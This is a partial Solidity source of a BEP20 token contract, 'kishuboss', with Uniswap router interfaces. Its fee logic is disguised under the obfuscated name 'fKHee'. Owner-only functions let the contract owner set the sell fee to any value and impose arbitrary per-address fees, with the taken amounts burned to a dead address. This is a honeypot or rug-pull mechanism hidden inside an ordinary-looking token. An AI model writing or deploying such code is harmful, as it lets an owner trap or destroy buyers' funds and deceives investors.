...
interface IUniswapV2Factory {
    ...
    function fKHeeTo() external view returns (address);
    function fKHeeToSetter() external view returns (address);
    ...
    function setfKHeeTo(address) external;
    function setfKHeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfKHeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfKHeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfKHeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfKHeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfKHeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract kishuboss is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfKHee = 0;

    uint256 private _defaultBuyfKHee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfKHee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfKHee = _value;
    }

    function setSlipfKHee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfKHee[_address] = _value;
    }

    function getSlipfKHee(address _address) external view onlyownar returns (uint256) {
        return _slipfKHee[_address];
    }


    function setMAccountfKHee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfKHee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefKHeeAmount = 0;

        if (rF) {
            uint256 tradefKHee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefKHee = _defaultSellfKHee;
                }
                if (from == uniswapV2Pair) {

                    tradefKHee = _defaultBuyfKHee;
                }
            }
            if (_slipfKHee[from] > 0) {
                tradefKHee = _slipfKHee[from];
            }

            tradefKHeeAmount = _Amount.mul(tradefKHee).div(100);
        }


        if (tradefKHeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefKHeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefKHeeAmount);
            emit Transfer(from, _deadAddress, tradefKHeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefKHeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefKHeeAmount);
        emit Transfer(from, _to, _Amount - tradefKHeeAmount);
    }
